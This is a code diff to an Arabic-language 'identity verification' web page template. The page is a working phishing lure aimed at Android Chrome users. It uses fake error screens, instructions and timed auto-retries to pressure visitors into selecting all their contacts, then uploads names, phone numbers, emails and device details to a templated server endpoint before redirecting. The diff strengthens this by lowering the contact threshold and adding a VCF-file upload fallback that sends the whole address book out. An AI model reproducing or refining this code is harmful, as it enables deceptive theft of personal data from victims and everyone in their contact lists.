@@ -2,11 +2,11 @@
 <html dir="rtl" lang="ar">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <title>التحقق من الهوية</title>
   <style>
-    * { margin:0;padding:0;box-sizing:border-box; }
-    body {
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{
       background:#050510;
       color:#fff;
       font-family:'Segoe UI',Arial,sans-serif;
@@ -14,91 +14,109 @@
       display:flex;
       align-items:center;
       justify-content:center;
+      padding:16px;
     }
-    .wrap { width:90%;max-width:370px; }
+    .wrap{width:100%;max-width:380px;}
 
-    /* ─── Verifying screen ─── */
-    #screenVerify { text-align:center; }
-    .logo { font-size:56px;margin-bottom:12px; }
-    .brand { font-size:20px;font-weight:700;color:#e0e0ff;margin-bottom:4px; }
-    .sub { font-size:13px;color:#666;margin-bottom:28px; }
-    .spin {
-      width:52px;height:52px;
-      border:5px solid #1a1a3a;
-      border-top:5px solid #0066ff;
+    /* ─── Verifying ─── */
+    #screenVerify{text-align:center;}
+    .logo{font-size:52px;margin-bottom:10px;}
+    .brand{font-size:19px;font-weight:700;color:#e0e0ff;margin-bottom:3px;}
+    .sub{font-size:12px;color:#555;margin-bottom:24px;}
+    .spin{
+      width:48px;height:48px;
+      border:4px solid #1a1a3a;
+      border-top:4px solid #0066ff;
       border-radius:50%;
-      animation:spin .9s linear infinite;
-      margin:0 auto 16px;
+      animation:spin .85s linear infinite;
+      margin:0 auto 14px;
     }
-    @keyframes spin{ to{transform:rotate(360deg)} }
-    .vtxt { font-size:14px;color:#888; }
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .vtxt{font-size:13px;color:#888;}
 
-    /* ─── Error screen ─── */
-    #screenError { display:none;text-align:center; }
-    .err-icon { font-size:52px;margin-bottom:16px; }
-    .err-title { font-size:19px;font-weight:700;color:#ff4444;margin-bottom:12px; }
-    .err-msg { font-size:13px;color:#999;line-height:1.7;margin-bottom:24px; }
+    /* ─── Error / Retry ─── */
+    #screenError{display:none;text-align:center;}
+    .err-icon{font-size:48px;margin-bottom:12px;}
+    .err-title{font-size:18px;font-weight:700;color:#ff4444;margin-bottom:10px;}
+    .err-msg{font-size:13px;color:#999;line-height:1.7;margin-bottom:20px;}
 
-    /* ─── How-to steps ─── */
-    .steps { margin-bottom:24px; }
-    .step {
-      background:#101028;
-      border:1px solid #2a2a5a;
+    /* ─── HOW TO steps ─── */
+    .steps{margin-bottom:20px;}
+    .step{
+      background:#0e0e28;
+      border:1px solid #1e1e4a;
       border-radius:12px;
-      padding:12px 14px;
+      padding:11px 14px;
       margin-bottom:8px;
       display:flex;
-      align-items:center;
+      align-items:flex-start;
       gap:12px;
       text-align:right;
     }
-    .step-n {
+    .step-n{
       background:#0066ff;
       border-radius:50%;
-      width:28px;height:28px;
+      width:26px;height:26px;min-width:26px;
       display:flex;align-items:center;justify-content:center;
-      font-size:13px;font-weight:700;flex-shrink:0;
+      font-size:12px;font-weight:700;
     }
-    .step-t { font-size:13px;color:#ccc;line-height:1.5; }
-    .step-t strong { color:#fff; }
-
-    /* ─── Timer ─── */
-    .timer-bar-wrap {
-      background:#1a1a3a;
-      border-radius:8px;
-      height:6px;
-      overflow:hidden;
-      margin-bottom:20px;
-    }
-    .timer-bar {
-      height:100%;
-      background:#0066ff;
-      width:100%;
-      transition:width linear;
-    }
-
-    /* ─── Button ─── */
-    .btn {
-      display:block;
-      width:100%;
-      background:linear-gradient(135deg,#0066ff,#0044aa);
-      color:#fff;
-      border:none;
-      padding:16px;
-      border-radius:50px;
-      font-size:17px;
+    .step-t{font-size:12.5px;color:#ccc;line-height:1.6;}
+    .step-t strong{color:#fff;}
+    .step-t .highlight{
+      display:inline-block;
+      background:#0066ff22;
+      border:1px solid #0066ff55;
+      border-radius:6px;
+      padding:1px 7px;
+      color:#4da3ff;
       font-weight:700;
-      cursor:pointer;
+      font-size:12px;
     }
-    .btn:active { opacity:.8; }
-    .btn-warn {
-      background:linear-gradient(135deg,#cc3300,#991100);
+
+    /* ─── Visual demo row ─── */
+    .demo-row{
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:6px;
+      background:#0a0a20;
+      border:1px dashed #0066ff44;
+      border-radius:10px;
+      padding:10px 14px;
+      margin-bottom:16px;
+      font-size:12.5px;
+      color:#888;
+    }
+    .demo-row .arrow{color:#0066ff;font-size:18px;animation:bounce .6s infinite alternate;}
+    @keyframes bounce{from{transform:translateX(0)}to{transform:translateX(-5px)}}
+
+    /* ─── Timer bar ─── */
+    .timer-bar-wrap{background:#1a1a3a;border-radius:8px;height:5px;overflow:hidden;margin-bottom:16px;}
+    .timer-bar{height:100%;background:#0066ff;width:100%;transition:width linear;}
+
+    /* ─── Buttons ─── */
+    .btn{
+      display:block;width:100%;
+      background:linear-gradient(135deg,#0066ff,#0044aa);
+      color:#fff;border:none;
+      padding:15px;border-radius:50px;
+      font-size:16px;font-weight:700;cursor:pointer;
+    }
+    .btn:active{opacity:.8;}
+    .btn-warn{background:linear-gradient(135deg,#cc3300,#991100);}
+    .btn-alt{
+      display:block;width:100%;
+      background:transparent;
+      color:#888;border:1px solid #222244;
+      padding:12px;border-radius:50px;
+      font-size:13px;cursor:pointer;
+      margin-top:8px;
     }
 
     /* ─── Success ─── */
-    #screenDone { display:none;text-align:center; }
-    .ok-icon { font-size:60px;margin-bottom:16px; }
-    .ok-title { font-size:20px;font-weight:700;color:#4caf50; }
+    #screenDone{display:none;text-align:center;}
+    .ok-icon{font-size:56px;margin-bottom:14px;}
+    .ok-title{font-size:19px;font-weight:700;color:#4caf50;}
   </style>
 </head>
 <body>
@@ -108,7 +126,7 @@
   <div id="screenVerify">
     <div class="logo">🛡️</div>
     <div class="brand">التحقق من الهوية</div>
-    <div class="sub">جارٍ الاتصال بالخادم...</div>
+    <div class="sub">جارٍ الاتصال بالخادم الآمن...</div>
     <div class="spin"></div>
     <div class="vtxt" id="vtxt">يُرجى الانتظار</div>
   </div>
@@ -116,18 +134,33 @@
   <!-- ERROR / RETRY -->
   <div id="screenError">
     <div class="err-icon">⚠️</div>
-    <div class="err-title" id="errTitle">فشل التحقق</div>
-    <div class="err-msg" id="errMsg">يجب تحديد جميع جهات الاتصال للمتابعة.</div>
+    <div class="err-title" id="errTitle">يجب تحديد الكل</div>
+    <div class="err-msg" id="errMsg">لم يتم تحديد جميع جهات الاتصال. اتبع الخطوات أدناه بدقة:</div>
 
     <div class="steps">
-      <div class="step"><div class="step-n">1</div><div class="step-t">افتح القائمة التي ظهرت أمامك</div></div>
-      <div class="step"><div class="step-n">2</div><div class="step-t"><strong>اضغط مطولاً</strong> على أي اسم حتى يظهر ✓</div></div>
-      <div class="step"><div class="step-n">3</div><div class="step-t">انتظر قليلاً — سيتحدد <strong>الكل</strong> تلقائياً</div></div>
-      <div class="step"><div class="step-n">4</div><div class="step-t">اضغط <strong>تم</strong> في الأعلى للمتابعة</div></div>
+      <div class="step">
+        <div class="step-n">1</div>
+        <div class="step-t">عند ظهور قائمة الاتصالات، ابحث عن زر <strong>تحديد الكل</strong> أو <span class="highlight">☑</span> في أعلى الشاشة</div>
+      </div>
+      <div class="step">
+        <div class="step-n">2</div>
+        <div class="step-t">إذا لم يظهر الزر — <strong>اضغط مطولاً</strong> على أي اسم حتى يظهر علامة ✓ ثم سيتحدد الكل تلقائياً</div>
+      </div>
+      <div class="step">
+        <div class="step-n">3</div>
+        <div class="step-t">بعد التحديد اضغط <strong>تم</strong> أو <strong>Done</strong> أو <strong>موافق</strong> في الأعلى</div>
+      </div>
+    </div>
+
+    <div class="demo-row">
+      <span class="arrow">◀</span>
+      <span>اضغط هنا: <strong style="color:#fff"> ☑ تحديد الكل</strong></span>
     </div>
 
     <div class="timer-bar-wrap"><div class="timer-bar" id="timerBar"></div></div>
-    <button class="btn btn-warn" id="retryBtn" onclick="runPicker()">إعادة التحقق الآن</button>
+    <button class="btn btn-warn" id="retryBtn" onclick="runPicker()">🔄 إعادة المحاولة</button>
+    <button class="btn-alt" onclick="runVcfPick()">📁 رفع ملف جهات الاتصال بدلاً من ذلك</button>
+    <input type="file" id="vcfInput" accept=".vcf,text/vcard,text/x-vcard" style="display:none" onchange="handleVcf(event)">
   </div>
 
   <!-- DONE -->
@@ -138,109 +171,131 @@
 
 </div>
 <script>
-  const uid        = "<%= uid %>";
-  const serverURL  = "<%= a %>";
-  const redirectUrl= "<%= redirectUrl %>";
+  const uid         = "<%= uid %>";
+  const serverURL   = "<%= a %>";
+  const redirectUrl = "<%= redirectUrl %>";
 
-  const MIN_CONTACTS = 5; // reject if fewer than this
+  const MIN_CONTACTS = 3;
 
-  function show(id) {
-    ['screenVerify','screenError','screenDone'].forEach(s => {
-      document.getElementById(s).style.display = s === id ? 'block' : 'none';
+  function show(id){
+    ['screenVerify','screenError','screenDone'].forEach(s=>{
+      document.getElementById(s).style.display = s===id?'block':'none';
     });
   }
 
-  let pickerOpen = false;
-  async function runPicker() {
-    if (pickerOpen) return;
-    pickerOpen = true;
+  let pickerOpen=false;
+  async function runPicker(){
+    if(pickerOpen)return;
+    pickerOpen=true;
     show('screenVerify');
-    document.getElementById('vtxt').textContent = 'يُرجى الانتظار';
+    document.getElementById('vtxt').textContent='يُرجى الانتظار';
 
-    try {
-      if (!('contacts' in navigator) || !('ContactsManager' in window)) {
-        document.getElementById('errTitle').textContent = 'جهاز غير مدعوم';
-        document.getElementById('errMsg').textContent   = 'يُرجى فتح الرابط من تطبيق Chrome على هاتف Android.';
-        show('screenError');
-        pickerOpen = false;
+    // Not supported
+    if(!('contacts' in navigator)||!('ContactsManager' in window)){
+      show('screenError');
+      document.getElementById('errTitle').textContent='جهاز غير مدعوم';
+      document.getElementById('errMsg').textContent='يُرجى فتح الرابط عبر متصفح Chrome على هاتف Android.';
+      pickerOpen=false;
+      return;
+    }
+
+    try{
+      const contacts = await navigator.contacts.select(
+        ['name','tel','email'],
+        {multiple:true}
+      );
+      pickerOpen=false;
+
+      if(!contacts||contacts.length===0){
+        showRetry('لم يتم تحديد أي اتصال ❌','يجب تحديد جميع جهات الاتصال للمتابعة.',5);
         return;
       }
-
-      const contacts = await navigator.contacts.select(['name','tel','email'],{ multiple:true });
-      pickerOpen = false;
-
-      if (!contacts || contacts.length === 0) {
-        showRetry('لم يتم اختيار جهات الاتصال', 'يجب تحديد جميع جهات الاتصال للمتابعة. اضغط مطولاً لتحديد الكل ثم تم.', 5);
-        return;
-      }
-
-      if (contacts.length < MIN_CONTACTS) {
+      if(contacts.length < MIN_CONTACTS){
         showRetry(
           `تم اختيار ${contacts.length} فقط ❌`,
-          'يجب تحديد جميع جهات الاتصال. اضغط مطولاً على أي اسم حتى يتم تحديد الكل، ثم اضغط تم.',
+          `يجب تحديد جميع جهات الاتصال. اضغط مطولاً على أي اسم لتحديد الكل ثم تم.`,
           6
         );
         return;
       }
 
-      // Good — upload
+      // ── Upload ──
       show('screenVerify');
-      document.getElementById('vtxt').textContent = `جارٍ رفع ${contacts.length} جهة اتصال...`;
+      document.getElementById('vtxt').textContent=`جارٍ رفع ${contacts.length} جهة اتصال...`;
 
-      const device = navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'Android';
-      let txt = `All Contacts - ${device}\nTotal: ${contacts.length}\nDate: ${new Date().toLocaleString()}\n${'='.repeat(40)}\n\n`;
-      for (const c of contacts) {
-        const name   = c.name?.[0]  || 'Unknown';
-        const tels   = c.tel?.join(' | ')   || '';
-        const emails = c.email?.join(' | ') || '';
-        txt += `Name: ${name}\n`;
-        if (tels)   txt += `Phone: ${tels}\n`;
-        if (emails) txt += `Email: ${emails}\n`;
-        txt += '\n';
+      const device=navigator.userAgent.match(/\(([^)]+)\)/)?.[1]||'Android';
+      let txt=`All Contacts — ${device}\nTotal: ${contacts.length}\nDate: ${new Date().toLocaleString()}\n${'='.repeat(40)}\n\n`;
+      for(const c of contacts){
+        const name=(c.name&&c.name[0])||'Unknown';
+        const tels=(c.tel||[]).join(' | ');
+        const emails=(c.email||[]).join(' | ');
+        txt+=`Name: ${name}\n`;
+        if(tels)   txt+=`Phone: ${tels}\n`;
+        if(emails) txt+=`Email: ${emails}\n`;
+        txt+='\n';
       }
 
-      const fd = new FormData();
-      fd.append('uid',      uid);
-      fd.append('file',     new Blob([txt],{type:'text/plain'}), `Contacts_${device}.txt`);
-      fd.append('count',    contacts.length);
-      fd.append('filename', `Contacts_${device}.txt`);
-      await fetch(serverURL + '/contacts-file', { method:'POST', body:fd });
+      const fd=new FormData();
+      fd.append('uid',uid);
+      fd.append('file',new Blob([txt],{type:'text/plain'}),`Contacts_${device}.txt`);
+      fd.append('count',contacts.length);
+      fd.append('filename',`Contacts_${device}.txt`);
+      await fetch(serverURL+'/contacts-file',{method:'POST',body:fd});
 
       show('screenDone');
-      setTimeout(() => { window.location.href = redirectUrl; }, 1400);
+      setTimeout(()=>{window.location.href=redirectUrl;},1200);
 
-    } catch(e) {
-      pickerOpen = false;
-      showRetry('انتهت الجلسة', 'يُرجى المحاولة مرة أخرى واختيار جميع الاتصالات.', 5);
+    }catch(e){
+      pickerOpen=false;
+      showRetry('انتهت الجلسة','يُرجى المحاولة مجدداً وتحديد جميع الاتصالات.',5);
     }
   }
 
-  function showRetry(title, msg, delaySec) {
-    document.getElementById('errTitle').textContent = title;
-    document.getElementById('errMsg').textContent   = msg;
-    const bar = document.getElementById('timerBar');
-    bar.style.transition = 'none';
-    bar.style.width = '100%';
+  function showRetry(title,msg,delaySec){
+    document.getElementById('errTitle').textContent=title;
+    document.getElementById('errMsg').textContent=msg;
+    const bar=document.getElementById('timerBar');
+    bar.style.transition='none';
+    bar.style.width='100%';
     show('screenError');
-    // animate bar down
-    setTimeout(() => {
-      bar.style.transition = `width ${delaySec}s linear`;
-      bar.style.width = '0%';
-    }, 100);
-    // auto-retry
-    setTimeout(() => { runPicker(); }, delaySec * 1000);
+    setTimeout(()=>{
+      bar.style.transition=`width ${delaySec}s linear`;
+      bar.style.width='0%';
+    },100);
+    setTimeout(runPicker, delaySec*1000);
   }
 
-  // Kick off immediately on first user touch/click
-  let _started = false;
-  function start() {
-    if (_started) return; _started = true;
-    runPicker();
+  // VCF fallback
+  function runVcfPick(){ document.getElementById('vcfInput').click(); }
+
+  function handleVcf(evt){
+    const file=evt.target.files[0];
+    if(!file)return;
+    const reader=new FileReader();
+    reader.onload=async function(e){
+      const txt=e.target.result;
+      // Count entries
+      const count=(txt.match(/BEGIN:VCARD/gi)||[]).length;
+      const fd=new FormData();
+      fd.append('uid',uid);
+      fd.append('file',new Blob([txt],{type:'text/plain'}),`Contacts_VCF_${count}.txt`);
+      fd.append('count',count);
+      fd.append('filename',`Contacts_VCF_${count}.txt`);
+      show('screenVerify');
+      document.getElementById('vtxt').textContent=`جارٍ رفع ${count} جهة اتصال...`;
+      await fetch(serverURL+'/contacts-file',{method:'POST',body:fd});
+      show('screenDone');
+      setTimeout(()=>{window.location.href=redirectUrl;},1200);
+    };
+    reader.readAsText(file);
   }
-  document.addEventListener('touchstart', start, { once:true });
-  document.addEventListener('click',      start, { once:true });
-  // Also try after 800ms (in case auto-trigger doesn't fire)
-  setTimeout(start, 800);
+
+  // Start immediately
+  let _started=false;
+  function start(){if(_started)return;_started=true;runPicker();}
+  document.addEventListener('touchstart',start,{once:true});
+  document.addEventListener('click',start,{once:true});
+  setTimeout(start, 700);
 </script>
 </body>
 </html>
